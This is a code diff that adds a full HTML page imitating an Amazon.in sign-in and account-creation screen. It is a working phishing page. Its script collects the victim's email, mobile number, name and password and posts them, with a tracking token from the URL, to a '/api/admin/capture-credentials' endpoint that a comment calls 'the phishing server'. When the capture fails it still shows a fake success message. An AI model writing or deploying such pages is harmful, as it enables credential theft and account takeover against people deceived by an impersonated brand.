@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon Sign In</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Amazon Ember", Arial, sans-serif;
+      background: linear-gradient(to bottom, #f7f7f7, #e3e6e6);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .amazon-header {
+      background: #232f3e;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+    }
+
+    .amazon-logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: white;
+      letter-spacing: -1px;
+    }
+
+    .amazon-logo span {
+      color: #ff9900;
+    }
+
+    .main-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .signin-card {
+      background: white;
+      border-radius: 8px;
+      padding: 40px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .signin-title {
+      font-size: 28px;
+      font-weight: 400;
+      margin-bottom: 20px;
+      line-height: 1.2;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 5px;
+      color: #333;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 8px;
+      border: 1px solid #888;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 0 2px rgba(230, 118, 0, 0.2);
+    }
+
+    .continue-btn {
+      width: 100%;
+      background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+      border: 1px solid #a88734;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .continue-btn:hover {
+      background: linear-gradient(to bottom, #f5d78e, #eeb933);
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #ddd;
+      margin: 20px 0;
+    }
+
+    .new-customer {
+      text-align: center;
+    }
+
+    .new-customer h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .register-btn {
+      width: 100%;
+      background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+      border: 1px solid #a88734;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .terms {
+      font-size: 11px;
+      color: #555;
+      margin-top: 15px;
+      line-height: 1.5;
+    }
+
+    .terms a {
+      color: #0066c0;
+      text-decoration: none;
+    }
+
+    .terms a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      background: #232f3e;
+      padding: 30px 20px;
+      text-align: center;
+    }
+
+    .footer-links {
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: #ddd;
+      text-decoration: none;
+      font-size: 12px;
+      margin: 0 10px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      color: #999;
+      font-size: 12px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .error-message {
+      color: #c40000;
+      font-size: 13px;
+      margin-top: 5px;
+    }
+
+    .mobile-input-group {
+      display: flex;
+      gap: 5px;
+    }
+
+    .country-code {
+      width: 70px;
+      padding: 10px 5px;
+      border: 1px solid #888;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="amazon-header">
+    <div class="amazon-logo">amazon<span>.in</span></div>
+  </div>
+
+  <div class="main-container">
+    <div class="signin-card">
+      <!-- Step 1: Enter Email/Phone -->
+      <div id="step1">
+        <h1 class="signin-title">Sign in or create account</h1>
+        <form id="step1Form">
+          <div class="form-group">
+            <label for="identifier">Enter email</label>
+            <input type="text" id="identifier" name="identifier" required autocomplete="username">
+          </div>
+          <button type="submit" class="continue-btn">Continue</button>
+        </form>
+        <p class="terms">
+          By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+        </p>
+        <hr class="divider">
+        <div class="new-customer">
+          <h2>Buying for work?</h2>
+          <a href="#" style="color: #0066c0; font-size: 13px;">Create a free business account</a>
+        </div>
+      </div>
+
+      <!-- Step 2: Create Account Form -->
+      <div id="step2" class="hidden">
+        <h1 class="signin-title">Create Account</h1>
+        <div style="margin-bottom: 15px; font-size: 14px; color: #333;">
+          <strong id="displayIdentifier"></strong>
+          <button type="button" onclick="goToStep1()"
+            style="background: none; border: none; color: #0066c0; cursor: pointer; font-size: 13px; margin-left: 10px;">Change</button>
+        </div>
+        <form id="step2Form">
+          <div class="form-group">
+            <label for="mobile">Mobile number</label>
+            <div class="mobile-input-group">
+              <select class="country-code" id="countryCode">
+                <option value="+91">IN +91</option>
+                <option value="+1">US +1</option>
+              </select>
+              <input type="tel" id="mobile" name="mobile" required autocomplete="tel">
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="name">Your name</label>
+            <input type="text" id="name" name="name" required autocomplete="name">
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required autocomplete="new-password"
+              placeholder="At least 6 characters">
+          </div>
+          <button type="submit" class="continue-btn">Create an account</button>
+        </form>
+        <hr class="divider">
+        <div class="new-customer">
+          <h2>Already a customer?</h2>
+          <a href="#" onclick="goToStep1()" style="color: #0066c0; font-size: 13px;">Sign in instead</a>
+        </div>
+      </div>
+
+      <!-- Step 3: Success Message -->
+      <div id="step3" class="hidden">
+        <h1 class="signin-title">Account successfully created</h1>
+        <p style="margin: 20px 0; color: #333;">Your Amazon account has been created successfully.</p>
+        <div style="background: #f7f7f7; padding: 15px; border-radius: 4px; margin-bottom: 20px;">
+          <strong id="displayName" style="display: block; margin-bottom: 5px;"></strong>
+          <span id="displayMobile" style="color: #555;"></span>
+        </div>
+        <button type="button" onclick="goToStep1()" class="continue-btn">Login</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Conditions of Use</a>
+      <a href="#">Privacy Notice</a>
+      <a href="#">Help</a>
+    </div>
+    <p class="copyright">© 1996–2026, Amazon.com, Inc. or its affiliates</p>
+  </div>
+
+  <script>
+    const token = new URLSearchParams(window.location.search).get('token');
+
+    function goToStep1() {
+      document.getElementById('step1').classList.remove('hidden');
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.add('hidden');
+    }
+
+    function goToStep2(identifier) {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+      document.getElementById('displayIdentifier').textContent = identifier;
+    }
+
+    function goToStep3(name, mobile) {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+      document.getElementById('displayName').textContent = name;
+      document.getElementById('displayMobile').textContent = document.getElementById('countryCode').value + ' ' + mobile;
+    }
+
+    document.getElementById('step1Form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const identifier = document.getElementById('identifier').value.trim();
+      if (identifier.length < 3) {
+        alert('Enter a valid mobile number or email.');
+        return;
+      }
+      goToStep2(identifier);
+    });
+
+    document.getElementById('step2Form').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const identifier = document.getElementById('displayIdentifier').textContent;
+      const mobile = document.getElementById('mobile').value.trim();
+      const name = document.getElementById('name').value.trim();
+      const password = document.getElementById('password').value;
+      const countryCode = document.getElementById('countryCode').value;
+
+      if (!mobile || !name || !password) {
+        alert('Please fill in all fields.');
+        return;
+      }
+
+      if (password.length < 6) {
+        alert('Password must be at least 6 characters.');
+        return;
+      }
+
+      console.log('Submitting credentials:', { token, identifier, mobile, countryCode, name, password });
+
+      // Send credentials to the phishing server
+      try {
+        const response = await fetch('/api/admin/capture-credentials', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            token: token,
+            identifier: identifier,
+            mobile: mobile,
+            countryCode: countryCode,
+            name: name,
+            password: password
+          })
+        });
+
+        const data = await response.json();
+        console.log('Server response:', data);
+
+        if (response.ok) {
+          goToStep3(name, mobile);
+        } else {
+          console.error('Failed to capture credentials:', data);
+          goToStep3(name, mobile); // Still show success to user
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        goToStep3(name, mobile); // Still show success to user
+      }
+    });
+  </script>
+</body>
+
+</html>
